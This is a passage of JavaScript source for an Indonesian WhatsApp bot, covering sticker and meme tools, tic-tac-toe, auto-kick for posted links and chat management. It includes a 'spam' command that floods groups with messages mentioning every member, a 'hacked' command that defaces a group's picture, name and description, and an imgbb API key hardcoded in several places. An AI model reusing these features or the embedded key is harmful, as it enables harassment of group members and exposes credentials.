            Repor.sendMessage(from, 'Order Diterima Silahkan Lengkapi Formulir Berikut!\n\n\nID:\nServer:\nPembayaran:', text, { quoted: revz })		        		
        } else if (resbutton == 'MENU') {
            let mnu = Repor.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 73, "thumbnail": fs.readFileSync(`./media/logo.jpeg`), "surface": 'CATALOG' , 'message' :help(prefix)}}, {quoted:ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true, sendEphemeral: true, mentionedJid: [ow]}})
            Repor.relayWAMessage(mnu, {waitForAck: true})		            
        } else if (resbutton == 'PUBLIC') {
            public = true
			    Repor.sendMessage(from, `\`\`\`Status BOT : PUBLIC\`\`\``, text,{quoted : fakevn})         
        } else if (resbutton == 'SELF') {
            public = false
			    Repor.sendMessage(from, `\`\`\`Status BOT: SELF\`\`\``, text,{quoted : ftoko})  
        } else if (resbutton == 'CREATOR') {
            Repor.sendMessage(from, `${prefix}owner`, text, { quoted: revz })         
        } else if (resbutton == 'ADD BOT TO GRUP') {
             Repor.sendMessage(from, `Silahkan Ketik #join (linkgrup)`, text, { quoted: revz })
        } else if (resbutton == 'MODE') {
        if (!isOwner && !revz.key.fromMe) return reply('*Hanya Owner Yang Bisa Mengakses Fitur Ini*')
            Repor.sendMessage(from, `${prefix}mode`, text, { quoted: revz })           
        }			
    
const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					Repor.sendMessage(to, media, sticker,{quoted : revz})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}


const uploadImages = (buffData, type) => {
    // eslint-disable-next-line no-async-promise-executor
    return new Promise(async (resolve, reject) => {
        const { ext } = await fromBuffer(buffData)
        const cmd = text.toLowerCase()
        const filePath = 'utils/tmp.' + ext
        const _buffData = type ? await resizeImage(buffData, false) : buffData
        fs.writeFile(filePath, _buffData, { encoding: 'base64' }, (err) => {
            if (err) return reject(err)
            console.log('Uploading image to telegra.ph server...')
            const fileData = fs.readFileSync(filePath)
            const form = new FormData()
            form.append('file', fileData, 'tmp.' + ext)
            fetch('https://telegra.ph/upload', {
                method: 'POST',
                body: form
            })
                .then(res => res.json())
                .then(res => {
                    if (res.error) return reject(res.error)
                    resolve('https://telegra.ph' + res[0].src)
                })
                .then(() => fs.unlinkSync(filePath))
                .catch(err => reject(err))
        })
    })
}



			colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
		    const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
			const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')

    /*--------------------[ Tictactoe Game Function ]--------------------*/
const cmde = budy.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
     if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
          const boardnow = setGame(`${from}`);
          if (budy == "Cex") return reply("why");
          if (
               budy.toLowerCase() == "y" ||
               budy.toLowerCase() == "yes" ||
               budy.toLowerCase() == "ya"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`Game telah dimulai sebelumnya!`);
                    const matrix = boardnow._matrix;
                    boardnow.status = true;
                    fs.writeFileSync(
                         `./lib/tictactoe/db/${from}.json`,
                         JSON.stringify(boardnow, null, 2)
                    );
                    const chatAccept = `*🎮 Tictactoe Game 🎳*
                    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
               
Giliran : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}

`;
                    Repor.sendMessage(from, chatAccept, MessageType.text, {
                         quoted: revz,
                         contextInfo: {
                              mentionedJid: [
                                   boardnow.X + "@s.whatsapp.net",
                                   boardnow.O + "@s.whatsapp.net",
                              ],
                         },
                    });
               } else {
                    Repor.sendMessage(
                         from,
                         `Opsi ini hanya untuk @${boardnow.O} !`,
                         MessageType.text, {
                         quoted: revz,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          } else if (
               budy.toLowerCase() == "n" ||
               budy.toLowerCase() == "no" ||
               budy.toLowerCase() == "tidak"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`Game telah dimulai sebelumnya!`);
                    fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
                    Repor.sendMessage(
                         from,
                         `Sayangnya tantangan @${boardnow.X} ditolak ❌😕`,
                         MessageType.text, {
                         quoted: revz,
                         contextInfo: {
                              mentionedJid: [boardnow.X + "@s.whatsapp.net"],
                         },
                    }
                    );
               } else {
                    Repor.sendMessage(
                         from,
                         `Opsi ini hanya untuk @${boardnow.O} !`,
                         MessageType.text, {
                         quoted: revz,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          }
     }

if (messagesCC.includes("https://")){
					if (!isGroup) return
					if (!isAntiLink) return
					if (isGroupAdmins) return reply('Because you are an admin the bot will not remove you')
					if (!isBotGroupAdmins) return reply(`Saya bukan admin kak`)
					Repor.updatePresence(from, Presence.composing)
					if (messagesCC.includes("#izinadmin")) return reply("```Permission Received```")
					var kic = `${sender.split("@")[0]}@s.whatsapp.net`
					reply(`Link Group Detected maaf ${sender.split("@")[0]} anda akan di kick dari group 5  seconds lagi`)
					setTimeout( () => {
					Repor.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
					}, 5000)
					setTimeout( () => {
					Repor.updatePresence(from, Presence.composing)
					reply("Satu")
					}, 4000)
					setTimeout( () => {
					Repor.updatePresence(from, Presence.composing)
					reply("Dua")
					}, 3000)
					setTimeout( () => {
					Repor.updatePresence(from, Presence.composing)
					reply("Tiga")
					}, 2000)
					setTimeout( () => {
					Repor.updatePresence(from, Presence.composing)
					reply("Empat")
					}, 1000)
					setTimeout( () => {
					Repor.updatePresence(from, Presence.composing)
					reply("Lima")
					}, 0)
				    }
				    
     if (arrNum.includes(cmde)) {
          const boardnow = setGame(`${from}`);
          if (!boardnow.status) return reply(`Sepertinya lawan anda belum menerima / menolak tantangan.`)
          if (
               (boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
               sender.replace("@s.whatsapp.net", "")
          )
               return;
          const moving = validmove(Number(budy), `${from}`);
          const matrix = moving._matrix;
          if (moving.isWin) {
               if (moving.winner == "SERI") {
                    const chatEqual = `*🎮 Tictactoe Game 🎳*
          
Game berakhir seri 😐
`;
                    reply(chatEqual);
                    fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
                    return;
               }
               const winnerJID = moving.winner == "O" ? moving.O : moving.X;
               const looseJID = moving.winner == "O" ? moving.X : moving.O;
               const limWin = Math.floor(Math.random() * 20) + 10;
               const limLoose = Math.floor(Math.random() * 10) + 5;
               const chatWon = `*🎮 Tictactoe Game 🎳*
          
Telah dimenangkan oleh @${winnerJID} 😎👑
`;
            //    giftLimit(winnerJID + "@s.whatsapp.net", limWin);
            //    pushLimit(looseJID + "@s.whatsapp.net", limLoose);
               Repor.sendMessage(from, chatWon, MessageType.text, {
                    quoted: revz,
                    contextInfo: {
                         mentionedJid: [
                              moving.winner == "O" ?
                                   moving.O + "@s.whatsapp.net" :
                                   moving.X + "@s.whatsapp.net",
                         ],
                    },
               });
               fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
          } else {
               const chatMove = `*🎮 Tictactoe Game 🎳*
          
❌ : @${moving.X}
⭕ : @${moving.O}

Giliran : @${moving.turn == "X" ? moving.X : moving.O}


     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


`;
               Repor.sendMessage(from, chatMove, MessageType.text, {
                    quoted: revz,
                    contextInfo: {
                         mentionedJid: [
                              moving.X + "@s.whatsapp.net",
                              moving.O + "@s.whatsapp.net",
                         ],
                    },
               });
          }
     }


   if (itsMe){
     if(chats.toLowerCase() == `${prefix}`){
       public = false
       Repor.sendMessage(from, `Success`, `STATUS : SELF`)
     }
     if (chats.toLowerCase() == 'status'){
       Repor.sendMessage(from, `STATUS : ${public ? 'PUBLIC' : 'SELF'}`)
     }
   }
   
  if (!public){
    if (!isOwner && !revz.key.fromMe) return
  }


			if (!isGroup && !isCmd) console.log(color(time, "white"), color("[ PRIVATE ]", "aqua"), color(budy, "white"), "from", color(sender.split('@')[0], "yellow"))
            if (isGroup && !isCmd) console.log(color(time, "white"), color("[  GROUP  ]", "aqua"), color(budy, "white"), "from", color(sender.split('@')[0], "yellow"), "in", color(groupName, "yellow"))
            if (!isGroup && isCmd) console.log(color(time, "white"), color("[ COMMAND ]", "aqua"), color(budy, "white"), "from", color(sender.split('@')[0], "yellow"))
            if (isGroup && isCmd) console.log(color(time, "white"), color("[ COMMAND ]", "aqua"), color(budy, "white"), "from", color(sender.split('@')[0], "yellow"), "in", color(groupName, "yellow"))
            
			let authorname = Repor.contacts[from] != undefined ? Repor.contacts[from].vname || Repor.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }	
			
			function addMetadata(packname, author) {	
				if (!packname) packname = 'Repor'; if (!author) author = '994404819287';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./src/stickers/${name}.exif`)) return `./src/stickers/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	

				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	

				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	

				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	

				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./src/stickers/${name}.exif`, buffer, (err) => {	
					return `./src/stickers/${name}.exif`	
				})	

			}

     

			switch(command) {
//*********batas**********//*********batas**********//*********batas**********//*********batas**********//*********batas**********//*********batas**********//*********batas**********

case prefix+ 'menu':
                let menu = Repor.prepareMessageFromContent(from, {
                    "listMessage":  {
                        "title": "*Z A M  B O T*",
                        "description": "*PILIH KACK*",
                        "buttonText": "Click Me🤡🙏",
                        "listType": "SINGLE_SELECT",
                        "sections": [
                            {
                                "rows": [
                                    {
                                        "title": `MENU`,
                                        "description": "SHOW MENU",
                                        "rowId": `${prefix}showmenu`                                                                                                                                               
                                    }, 
                                                                        {
                                        "title": `ADD BOT TO GRUP`,
                                        "description": "ADD BOT GRATIS",
                                        "rowId": ""                                                                                                                                             
                                    }, 
                                                                        {
                                        "title": `CREATOR`,
                                        "description": "OWNER TAMPAN",
                                        "rowId": `${prefix}author`                                                                                                                                               
                                    }, 
                                                                                                            {
                                        "title": `MODE`,
                                        "description": "MODE PUBLIC+SELF",
                                        "rowId": `${prefix}mode`                                                                                                                                               
                                    }
                                ]
                            }
                        ]
                    }
                }, {})
            Repor.relayWAMessage(menu, {waitForAck: true})
            break   
                case prefix+'showmenu':
let mnu = Repor.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 73, "thumbnail": fs.readFileSync(`./media/logo.jpeg`), "surface": 'CATALOG' , 'message' :help(prefix)}}, {quoted:ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true, sendEphemeral: true, mentionedJid: [ow]}})
            Repor.relayWAMessage(mnu, {waitForAck: true})
            break
                  case prefix+ 'kerangajaib':
                  
kerang =`_Fitur untuk random jawaban_
_hanya untuk fun_

❏ : *${prefix}apakah*
Format: /apakah (kata-kata)
Contoh: /apakah jokowi pengocok handal🤤?

❏ : *${prefix}kapankah*
Format: /kapankah (kata-kata)
Contoh: /kapankah hutang indonesia lunas?

❏ : *${prefix}bisakah*
Format: /bisakah (kata-kata)
Contoh: /bisakah jokowi stop jadi pengocok?`
Repor.sendMessage(from , kerang, text,{quoted : tys, contextInfo: {"forwardingScore": 999, "isForwarded": true, sendEphemeral: true}})
                 break
                 case prefix+ 'setprefix':
                 
					if(!isOwner && !revz.key.fromMe) return reply("Command only for owner bot")
					prefix = args[0]
					reply(`Prefix berhasil di ubah menjadi : ${prefix}`)
					break
					
			
                 case prefix+ 'clearall':
                 
			if (!isOwner && !revz.key.fromMe) return('_Lu Siapa?_')
			 anu = await Repor.chats.all()
				Repor.setMaxListeners(25)
				for (let _ of anu) {
					Repor.deleteChat(_.jid)
				}
				reply('𝗰𝗹𝗲𝗮𝗿 𝗮𝗹𝗹 𝘀𝘂𝗸𝘀𝗲𝘀')
				break
				case prefix+ 'cmd':
				
            reply('Sedang Proses...')
	           var teks = encodeURIComponent(body.slice(4))
		       if (!teks) return Repor.sendMessage(from,  MessageType.text, { quoted: revz, contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
               var buffer  = await  getBuffer(`https://api-rull.herokuapp.com/api/cmd?code=${teks}`)
               Repor.sendMessage(from, buffer, image,  { quoted: revz, contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
            break
case prefix+ 'stickmeme':
case prefix+ 'stcmeme':

var tex1 = body.slice(11).split('|')[0]
var tex2 = body.slice(11).split('|')[1]
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickmeme.jpeg')
teks = `${anu.display_url}`
										sendStickerUrl(from, `http://lolhuman.herokuapp.com/api/memegen?apikey=${LolKey}&texttop=${tex1}&textbottom=${tex2}&img=${teks}`, revz)
fs.unlinkSync('./stickmeme.jpeg')
}
break

case prefix+ 'hacked':

if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   Repor.updateProfilePicture (from, tessgc)
                   await sleepp(1000)
                Repor.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleepp(1000)
                Repor.groupUpdateDescription(from, `_Owner Telah Meretas Grup ini_`)             
                await sleepp(1000)
                Repor.sendMessage(from, 'Succes Hacked', text, {quoted: floc2})
					break
					
				
              
					case prefix+ 'tts' :
					
					tts = body.slice(4)
  ranm = getRandom('.mp3')
  rano = getRandom('.ogg')

/*
 * save audio file
 */

gtts.save(ranm, tts, function() {
  
 console.log(`AUDIO ${tts} SUKSES DIBUAT, MENGIRIMKAN FILE KE WA`);
          const
         {
            exec
         } = require("child_process");
				exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {

	if(tts.length > 200){ // check longness of text, because otherways google translate will give me a empty file
       Repor.sendMessage(id, 'Kepanjangan Tolol, Maksimal 200 Karakter', MessageType.text, {quoted: troli})
}else{
Repor.updatePresence(from, Presence.recording)
       fs.unlinkSync(ranm)
 const buffer = fs.readFileSync(rano)
	Repor.sendMessage(from, buffer, MessageType.audio, {quoted: fakevn, ptt :true})
       fs.unlinkSync(rano)
                }
       
            }
        )
    
    });
   
    break
    
case prefix+ 'stickmeme2':
case prefix+ 'stcmeme2':

if (!isQuotedSticker) return reply(' reply stickernya gan')
var tex1 = body.slice(10).split('|')[0]
var tex2 = body.slice(10).split('|')[1]
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickmeme.jpeg')
teks = `${anu.display_url}`
										sendStickerUrl(from, `https://pecundang.herokuapp.com/api/memegen2?teks1=${tex1}&teks2=${tex2}&img_url=${teks}`, revz)
fs.unlinkSync('./stickmeme.jpeg')
}
break
case prefix+ 'stickatas':
case prefix+ 'stcatas':

memelangit = args.join(" ")
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait, {contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickmeme.jpeg')
teks = `${anu.display_url}`
										sendStickerUrl(from, `https://lolhuman.herokuapp.com/api/convert/towebpauthor?apikey=${LolKey}&img=https://api.memegen.link/images/custom/${memelangit}/_.png?background=${teks}&package=Repor&author=Self`, revz)
fs.unlinkSync('./stickmeme.jpeg')
}
break
case prefix+ 'stickatas2':
case prefix+ 'stcatas2':

if (!isQuotedSticker) return reply(' reply stickernya gan')
memelangit = args.join(" ")
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait, {contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickmeme.jpeg')
teks = `${anu.display_url}`
										sendStickerUrl(from, `https://lolhuman.herokuapp.com/api/convert/towebpauthor?apikey=${LolKey}&img=https://api.memegen.link/images/custom/${memelangit}/_.png?background=${teks}&package=Repor&author=Self`, revz)
fs.unlinkSync('./stickmeme.jpeg')
}
break
case prefix+ 'stickbawah':
case prefix+ 'stcbawah':

memebawah_tanah = args.join(" ")
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickmeme.jpeg')
teks = `${anu.display_url}`
										sendStickerUrl(from, `https://lolhuman.herokuapp.com/api/convert/towebpauthor?apikey=${LolKey}&img=https://api.memegen.link/images/custom/_/${memebawah_tanah}.png?background=${teks}&package=Repor&author=Self`, revz)
fs.unlinkSync('./stickmeme.jpeg')
}
break
case prefix+ 'stickbawah2':
case prefix+ 'stcbawah2':

if (!isQuotedSticker) return reply(' reply stickernya gan')
memebawah_tanah = args.join(" ")
if (revz.message.extendedTextMessage != undefined || revz.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgi = await Repor.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", './stickmeme.jpeg')
teks = `${anu.display_url}`
										sendStickerUrl(from, `https://lolhuman.herokuapp.com/api/convert/towebpauthor?apikey=${LolKey}&img=https://api.memegen.link/images/custom/_/${memebawah_tanah}.png?background=${teks}&package=Repor&author=Self`, revz)
fs.unlinkSync('./stickmeme.jpeg')
}
break
                  
                  case prefix+ 'spam':
                  
if (!isOwner && !revz.key.fromMe) return('_Lu Siapa?_')
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(6)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  var group = await Repor.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: oi1,
					contextInfo: { mentionedJid: mem },
					quoted: ftoko
					}
	  Repor.sendMessage(from, options, MessageType.text,{quoted:ftoko})
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = revz.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  var group = await Repor.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: teks,
					contextInfo: { mentionedJid: mem },
					quoted: ftoko
					}
	  Repor.sendMessage(from, options, MessageType.text,{quoted:ftoko})
	  }
} else if (isQuotedSticker) {
	encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await Repor.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Repor.sendMessage(from, anu, sticker,{quoted:ftoko})
	  }
} else if (isQuotedAudio) {
	encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await Repor.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Repor.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz
	delb = await Repor.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  Repor.sendMessage(from, delb, MessageType.image, {quoted : ftoko,caption: oi1})
	  }
}

	  break
                  case prefix+'addcmd': 
       case prefix+ 'setcmd':
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = revz.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              reply("Y DONE")
              } else {
              reply('tag stickenya')
}
              break

case prefix+ 'textmaker':

if ((isMedia && !revz.videoMessage || isQuotedImage)) {
var tex1 = body.slice(11).split('|')[0]
var tex2 = body.slice(11).split('|')[1]
if (!tex2) return reply('Format salah!')
    reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : revz
var media = await Repor.downloadAndSaveMediaMessage(encmedia)
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
getUrl = `${anu.display_url}`
buff = await getBuffer(`http://lolhuman.herokuapp.com/api/memegen?apikey=${LolKey}&texttop=${tex1}&textbottom=${tex2}&img=${getUrl}`)
Repor.sendMessage(from, buff, image, {quoted: revz})
}
break
                
                
			  
			  //********** SELF&PUBLIC **********//
			  case prefix+ 'self':
			  
			  if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
			    public = false
			    Repor.sendMessage(from, `\`\`\`Status BOT: SELF\`\`\``, text,{quoted : ftoko})
			    break
			    
			  case prefix+ 'public':
			  
			    if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
			    public = true
			    Repor.sendMessage(from, `\`\`\`Status BOT : PUBLIC\`\`\``, text,{quoted : fakevn})
			    break
			    
			  case prefix+ 'mode':
                let mode = Repor.prepareMessageFromContent(from, {
                    "listMessage":  {
                        "title": "*MODE Z A M  B O T*",
                        "description": "*SETTING SINI KACK*",
                        "buttonText": "Click Me🤡🙏",
                        "listType": "SINGLE_SELECT",
                        "sections": [
                            {
                                "rows": [
                                    {
                                        "title": `PUBLIC`,
                                        "description": "MODE PUBLIC",
                                        "rowId": `${prefix}public`                                                                                                                                               
                                    }, 
                                                                        {
                                        "title": `SELF`,
                                        "description": "MODE SELF",
                                        "rowId": `${prefix}self`                                                                                                                                               
                                    }, 
                                                                        {
                                        "title": `MENU`,
                                        "description": "SHOW MENU BOT",
                                        "rowId": `${prefix}menu`                                                                                                                                               
                                    }
                                ]
                            }
                        ]
                    }
                }, {})
            Repor.relayWAMessage(mode, {waitForAck: true})
            break   
            
			    
			    case prefix+ 'mute':
			    
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                Repor.modifyChat(from, ChatModification.mute, 24*60*60*1000)
                reply('*succes mute this chat*')
                console.log('succes mute chat = ' + from)
                break
            case prefix+ 'unmute':
            
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                Repor.modifyChat(from, ChatModification.unmute)
                reply('*succes unmute this chat*')
                console.log('succes unmute chat = ' + from)
                break
			    case prefix+ 'unpin':
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                Repor.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
            case prefix+ 'pin':
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                Repor.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
            case prefix+ 'unreadall':
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                var chats = await Repor.chats.all()
                chats.map( async ({ jid }) => {
                await Repor.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await Repor.sendMessage(from, teks, text, {quoted: revz})
		    console.log(chats.length)
	        break
            case prefix+ 'readall':
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                var chats = await Repor.chats.all()
                chats.map( async ({ jid }) => {
                await Repor.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await Repor.sendMessage(from, teks, text, {quoted: revz})
		console.log(chats.length)
		break
		
		case prefix+ 'jualan':
                let wek = Repor.prepareMessageFromContent(from, {
                    "listMessage":  {
                        "title": "*R E V Z S H O P*",
                        "description": "*ORDER DISINI YA SENPAI:3*",
                        "buttonText": "Click Me To Order",
                        "listType": "SINGLE_SELECT",
                        "sections": [
                            {
                                "rows": [
                                    {
                                        "title": `ML 11 DIAMONDS(+1 BONUS)`,
                                        "description": "Rp.5200",
                                        "rowId": `${prefix}menu`                                                                                                                                               
                                    }
                                ]
                            }
                        ]
                    }
                }, {})
            Repor.relayWAMessage(wek, {waitForAck: true})
            break   
            
            case prefix+ 'unarchiveall':
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await Repor.chats.all()
                for (let _ of anu) {
                Repor.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
            case prefix+ 'archive':
